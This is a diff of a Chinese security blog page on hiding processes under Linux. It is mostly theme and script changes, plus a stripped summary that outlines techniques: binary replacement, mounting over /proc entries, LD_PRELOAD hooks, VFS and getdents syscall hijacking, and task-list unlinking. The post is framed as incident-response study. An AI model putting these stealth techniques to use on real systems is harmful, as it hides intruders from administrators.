@@ -1,175 +1,232 @@
-<!DOCTYPE html><html lang="zh" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Linux下的隐藏进程 | Huanhuan の Blog</title><meta name="author" content="huanhuan"><meta name="copyright" content="huanhuan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言&emsp;之前一篇谈ebpf实现的后门的时候讲到利用了隐藏后门的技术，当时是hook了系统调用函数，在查询的时候通过篡改返回值的方式实现了进程的隐藏，但无论是利用方式还是兼容性都存在一些困难，所以通过这篇文章带大家了解一些常见的隐藏进程的方式和原理，同时也学习了一些更深层的隐藏进程的方式也同时分享些学习心得给大家。 进程查看&emsp;在讲隐藏进程之前，先带大家了解下查看进程的一些原理。我们">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Linux下的隐藏进程">
-<meta property="og:url" content="https://w-lovezz.github.io/huanhuan/2024/06/20/Linux%E4%B8%8B%E7%9A%84%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B/index.html">
-<meta property="og:site_name" content="Huanhuan の Blog">
-<meta property="og:description" content="前言&emsp;之前一篇谈ebpf实现的后门的时候讲到利用了隐藏后门的技术，当时是hook了系统调用函数，在查询的时候通过篡改返回值的方式实现了进程的隐藏，但无论是利用方式还是兼容性都存在一些困难，所以通过这篇文章带大家了解一些常见的隐藏进程的方式和原理，同时也学习了一些更深层的隐藏进程的方式也同时分享些学习心得给大家。 进程查看&emsp;在讲隐藏进程之前，先带大家了解下查看进程的一些原理。我们">
-<meta property="og:locale">
-<meta property="og:image" content="https://github.com/w-lovezz/image/raw/main/huanhuan.png">
-<meta property="article:published_time" content="2024-06-19T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-11-15T16:28:42.542Z">
-<meta property="article:author" content="huanhuan">
-<meta property="article:tag" content="隐藏进程">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://github.com/w-lovezz/image/raw/main/huanhuan.png"><link rel="shortcut icon" href="/huanhuan/img/favicon.png"><link rel="canonical" href="https://w-lovezz.github.io/huanhuan/2024/06/20/Linux%E4%B8%8B%E7%9A%84%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/huanhuan/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
-    (() => {
-      
-    const saveToLocal = {
-      set: (key, value, ttl) => {
-        if (!ttl) return
-        const expiry = Date.now() + ttl * 86400000
-        localStorage.setItem(key, JSON.stringify({ value, expiry }))
-      },
-      get: key => {
-        const itemStr = localStorage.getItem(key)
-        if (!itemStr) return undefined
-        const { value, expiry } = JSON.parse(itemStr)
-        if (Date.now() > expiry) {
-          localStorage.removeItem(key)
-          return undefined
-        }
-        return value
-      }
+<!DOCTYPE html><html lang="zh" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>Linux下的隐藏进程 | Huanhuan の Blog</title><meta name="keywords" content="隐藏进程"><meta name="author" content="huanhuan"><meta name="copyright" content="huanhuan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="Linux下的隐藏进程"><meta name="application-name" content="Linux下的隐藏进程"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="Linux下的隐藏进程"><meta property="og:url" content="https://w-lovezz.github.io/huanhuan/2024/06/20/Linux%E4%B8%8B%E7%9A%84%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B/index.html"><meta property="og:site_name" content="Huanhuan の Blog"><meta property="og:description" content="前言&amp;emsp;之前一篇谈ebpf实现的后门的时候讲到利用了隐藏后门的技术，当时是hook了系统调用函数，在查询的时候通过篡改返回值的方式实现了进程的隐藏，但无论是利用方式还是兼容性都存在一些困难，所以通过这篇文章带大家了解一些常见的隐藏进程的方式和原理，同时也学习了一些更深层的隐藏进程的方式也同时"><meta property="og:locale" content="zh"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="huanhuan"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="前言&amp;emsp;之前一篇谈ebpf实现的后门的时候讲到利用了隐藏后门的技术，当时是hook了系统调用函数，在查询的时候通过篡改返回值的方式实现了进程的隐藏，但无论是利用方式还是兼容性都存在一些困难，所以通过这篇文章带大家了解一些常见的隐藏进程的方式和原理，同时也学习了一些更深层的隐藏进程的方式也同时"><link rel="shortcut icon" href="/huanhuan/favicon.ico"><link rel="canonical" href="https://w-lovezz.github.io/huanhuan/2024/06/20/Linux%E4%B8%8B%E7%9A%84%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B/"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/huanhuan/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2024/07/27/125766904/ba62475f396df9de3316a08ed9e65d86_5680958632268053399..png"},
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  music_page_default: "nav_music",
+  root: '/huanhuan/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: undefined,
+  authorStatus: undefined,
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: huanhuan","link":"链接: ","source":"来源: Huanhuan の Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
     }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'Huanhuan の Blog',
+  title: 'Linux下的隐藏进程',
+  postAI: '',
+  pageFillDescription: '前言, 进程查看, 隐藏进程（用户态）, 命令替换, 隐藏x2Fprocx2Fpid, Ring3劫持lib库, 隐藏进程（内核态）, Ring1劫持VFS, 劫持系统调用, 链表摘除, 结语前言之前一篇谈实现的后门的时候讲到利用了隐藏后门的技术当时是了系统调用函数在查询的时候通过篡改返回值的方式实现了进程的隐藏但无论是利用方式还是兼容性都存在一些困难所以通过这篇文章带大家了解一些常见的隐藏进程的方式和原理同时也学习了一些更深层的隐藏进程的方式也同时分享些学习心得给大家进程查看在讲隐藏进程之前先带大家了解下查看进程的一些原理我们都知道看进程一般用到的就是看到的是命令执行瞬间的进程信息而可以持续对进程的监视那么他们是通过什么方式将进程都有哪些读取出来并展示的呢我们先尝试执行的命令通过跟踪查看的整个在系统里执行的过程发现实际是通过遍历文件的内容去输出结果的以之前的内存马的进程为例跟踪执行的过程跟踪执行的过程发现部分过程一致只不过还会显示些执行事件占用率等内容综上我们发现这些命令都是通过遍历文件内容来读取展示进程的那又是什么呢是一个独有的伪文件系统只存在在内核中不占用外存空间以文件系统的方式为访问系统内核数据的操作提供接口而在中每一个进程都有一个相应的文件以号命名而等命令都是针对下的文件夹做查询从而输出结果隐藏进程用户态命令替换命令替换是一种简单常见的隐藏进程方式既然需要通过等查看进程那么使用我们自己做好的命令文件替代即可当然这也很容易被发现如通过查看文件状态或查看文件的即可发现隐藏既然目录存在了和进程相关的文件夹那么隐藏进程对应的文件夹同样可达到隐藏进程的目的写一个脚本通过查看进程创建一个空文件夹并实现挂载即可发现看不到该进程了如想恢复使用即可那如何检查目录是否有文件夹被挂载呢挂载的原理在系统中挂载是将一个文件系统如分区设备或目录连接到现有的目录树上使得该文件系统的内容在目录树的某个点挂载点上可见挂载操作会覆盖挂载点原本的内容使得新挂载的文件系统内容显示在该挂载点上劫持库是系统的一个环境变量它可以影响程序的运行时的链接它允许你定义在程序运行前优先加载的动态链接库这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数通过这个环境变量我们可以在主程序和其动态链接库的中间加载别的动态链接库甚至覆盖正常的函数库那么我们可以使用这种方式实现隐藏进程的目的实现一个过滤进程名称为的代码编译生成动态库隐藏进程内核态劫持内核态隐藏进程的方法复杂但种类繁多劫持也算是一种老生常谈的技术那么什么是呢虚拟文件系统是操作系统内核中的一个抽象层用于提供对不同文件系统的统一访问接口它允许应用程序通过一致的系统调用接口访问不同类型的文件系统而不需要关心底层文件系统的具体实现细节的主要功能抽象文件系统提供一个统一的接口使得不同的文件系统如等在接口层面表现一致应用程序可以通过标准的系统调用如等访问文件而不需要知道底层文件系统的类型文件系统挂载和管理管理系统中所有已挂载的文件系统维护一个挂载点列表使得文件系统可以挂载到目录树的不同位置应用程序通过挂载点访问不同的文件系统路径解析将用户提供的文件路径解析为具体的文件系统操作解析路径名并定位到具体的文件或目录从而调用底层文件系统的具体操作函数缓存和优化提供文件系统缓存以提高文件系统操作的性能可以缓存文件系统的元数据和文件内容减少对底层存储设备的访问次数而目录就是一个的具体实现目录是中的一个虚拟文件系统它由内核动态创建用于提供系统和进程的运行时信息文件系统并不存储实际的数据而是内核通过接口动态生成内容当用户态通过等命令来访问目录中的信息时会调用不同的内核函数来处理这些请求使用命令直接读取进程目录下的节点文件时会调用系列函数这个函数用于查找并打开指定的文件使用命令列举所有进程目录时会调用系列函数这些函数用于读取目录的内容并返回目录中的文件和子目录列表但是列举目录和列举某个具体进程目录的实现有所不同会由函数负责列出目录下的所有文件和目录包括进程目录和静态目录但无论是读取进程信息还是列举进程目录最终都会调用函数来实例化进程目录这个函数负责根据当前系统中的进程状态动态生成进程目录项实现实例化进程目录的逻辑根据当前进程状态动态生成目录项静态目录在系统初始化是创建并挂载到下如该目录包含与文件系统相关的信息和配置如文件系统类型目录与帧缓冲设备相关提供帧缓冲设备的信息动态目录在访问时动态生成如本文实现了劫持函数隐藏指定进程思路及关键代码如下函数用于读取目录中的条目并调用回调函数来处理每个条目函数是将读取到的目录项信息传递给用户空间那我们仅需要实现自己的函数附带我们特定要求即可完成进程的隐藏由于后面其他进程要正常显示所以需要后续调用正常的函数要隐藏的进程号自定义函数隐藏特定隐藏该进程劫持函数初始化函数在模块加载时执行它打开目录保存原始的结构修改和指针以指向自定义的函数然后恢复内存保护效果如下劫持系统调用之前使用的时候会看到在遍历进程目录之前会调用函数该函数是系统条用之一用于读取目录条目通常用于实现用户态的功能通过可以从一个打开的目录文件描述符中读取目录项的列表那我们就可以通过劫持该函数实现隐藏进程实现如下查找系统调用表通过比较系统调用表中索引处的值是否等于的地址来确认保存初始系统调用函数指针实现劫持函数过滤掉指定调用原始获取目录列表项要隐藏的链表摘除链表摘除隐藏进程除了需要理解一些实现的函数还需要了解的进程管理相关内容后面会补充一个隐藏进程的前置文章关于这部分的内核相关的东西这里先大概提下思路之前也提到关于进程管理是会有个的结构体的其中包含了进程的资源文件等相关内容其中所有的进程可通过链表一个链接所有进程的双向循环链表进行管理其中一种隐藏进程的方式就是通过将该进程结构体从链表摘除实现核心代码实现如下伪代码初始化一个内核模块将等内容作为参数遍历系统进程并找出你想隐藏的查找指定的进程并将其从任务链表中移除没有或者没找到进程正常报错返回结语感觉目前比较常见的隐藏方式就是这些了包括上篇文章提到的结合隐藏进程也是在函数做的手脚但是在网上看到了一篇文章介绍了还有更多的方式学习了下确实很难实现看看后面能不能补充吧因为一直在做应急所以排隐藏进程的情况还是比较容易遇见所以也写了这篇流水账附实现了一个检查隐藏进程的脚本遍历内存结构体的方式同时也结合了其他手段一起验证昨天测了下可以检测到隐藏的进程有需要可以找我但是基于内核做的可能有的版本不适配普遍内核版本较低很多函数没有声明文中所使用的环境均为内网环境本文仅用于学习交流目的严禁将本文中的技术用于违法犯罪目的参考链接',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: true,
+  isToc: true,
+  postUpdate: '2024-11-16 00:28:42',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-    window.btf = {
-      saveToLocal,
-      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
         const script = document.createElement('script')
         script.src = url
         script.async = true
-        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
-        script.onload = script.onreadystatechange = () => {
-          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
-        }
         script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
         document.head.appendChild(script)
-      }),
-      getCSS: (url, id) => new Promise((resolve, reject) => {
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
         const link = document.createElement('link')
         link.rel = 'stylesheet'
         link.href = url
         if (id) link.id = id
-        link.onload = link.onreadystatechange = () => {
-          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
-        }
         link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
         document.head.appendChild(link)
-      }),
-      addGlobalFn: (key, fn, name = false, parent = window) => {
-        if (!false && key.startsWith('pjax')) return
-        const globalFn = parent.globalFn || {}
-        globalFn[key] = globalFn[key] || {}
-        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
-        parent.globalFn = globalFn
-      }
-    }
-  
-      
-      const activateDarkMode = () => {
+      })
+    
+      win.activateDarkMode = () => {
         document.documentElement.setAttribute('data-theme', 'dark')
         if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
         }
       }
-      const activateLightMode = () => {
+      win.activateLightMode = () => {
         document.documentElement.setAttribute('data-theme', 'light')
         if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
         }
       }
-
-      btf.activateDarkMode = activateDarkMode
-      btf.activateLightMode = activateLightMode
-
-      const theme = saveToLocal.get('theme')
+      const t = saveToLocal.get('theme')
     
-          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
         
-      
       const asideStatus = saveToLocal.get('aside-status')
       if (asideStatus !== undefined) {
-        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
       }
     
-      
-    const detectApple = () => {
-      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
-        document.documentElement.classList.add('apple')
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
       }
-    }
-    detectApple()
-  
-    })()
-  </script><script>const GLOBAL_CONFIG = {
-  root: '/huanhuan/',
-  algolia: undefined,
-  localSearch: undefined,
-  translate: undefined,
-  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
-  copy: {
-    success: 'Copy Successful',
-    error: 'Copy Failed',
-    noSupport: 'Browser Not Supported'
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/huanhuan/css/music.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
   },
-  relativeDate: {
-    homepage: false,
-    post: false
-  },
-  runtime: '',
-  dateSuffix: {
-    just: 'Just now',
-    min: 'minutes ago',
-    hour: 'hours ago',
-    day: 'days ago',
-    month: 'months ago'
-  },
-  copyright: undefined,
-  lightbox: 'null',
-  Snackbar: undefined,
-  infinitegrid: {
-    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
-    buttonText: 'Load More'
-  },
-  isPhotoFigcaption: false,
-  islazyload: false,
-  isAnchor: false,
-  percent: {
-    toc: true,
-    rightside: false,
-  },
-  autoDarkmode: false
-}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: 'Linux下的隐藏进程',
-  isPost: true,
-  isHome: false,
-  isHighlightShrink: false,
-  isToc: true,
-  isShuoshuo: false
-}</script><link rel="stylesheet" href="APlayer.min.css"><div id="aplayer"></div><script src="https://cdn.jsdelivr.net/gh/radium-bit/res@master/live2d/autoload.js" async></script><script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js" async></script><link rel="stylesheet" href="/huanhuan/css/modify.css"><link rel="stylesheet" href="/huanhuan/css/music.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="/css/music.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(https://github.com/w-lovezz/image/raw/main/background.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://github.com/w-lovezz/image/raw/main/huanhuan.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/huanhuan/archives/"><div class="headline">Articles</div><div class="length-num">4</div></a><a href="/huanhuan/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/huanhuan/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/huanhuan/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/huanhuan/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/huanhuan/music/"><i class="fa-fw fas fa-music"></i><span> 音乐馆</span></a></div><div class="menus_item"><a class="site-page" href="/huanhuan/about/"><i class="fa-fw fas fa-about"></i><span> About站长</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://github.com/w-lovezz/image/raw/main/background.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/huanhuan/"><span class="site-name">Huanhuan の Blog</span></a><a class="nav-page-title" href="/huanhuan/"><span class="site-name">Linux下的隐藏进程</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/huanhuan/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/huanhuan/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/huanhuan/music/"><i class="fa-fw fas fa-music"></i><span> 音乐馆</span></a></div><div class="menus_item"><a class="site-page" href="/huanhuan/about/"><i class="fa-fw fas fa-about"></i><span> About站长</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Linux下的隐藏进程</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-06-19T16:00:00.000Z" title="Created 2024-06-20 00:00:00">2024-06-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-11-15T16:28:42.542Z" title="Updated 2024-11-16 00:28:42">2024-11-16</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;之前一篇谈ebpf实现的后门的时候讲到利用了隐藏后门的技术，当时是hook了系统调用函数，在查询的时候通过篡改返回值的方式实现了进程的隐藏，但无论是利用方式还是兼容性都存在一些困难，所以通过这篇文章带大家了解一些常见的隐藏进程的方式和原理，同时也学习了一些更深层的隐藏进程的方式也同时分享些学习心得给大家。</p>
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/huanhuan/" accesskey="h"><div class="title">Huanhuan の Blog</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/huanhuan/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/huanhuan/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/huanhuan/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/huanhuan/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/huanhuan/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/huanhuan/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/huanhuan/music/?id=543113542&amp;server=netease"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/huanhuan/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/huanhuan/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/huanhuan/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div 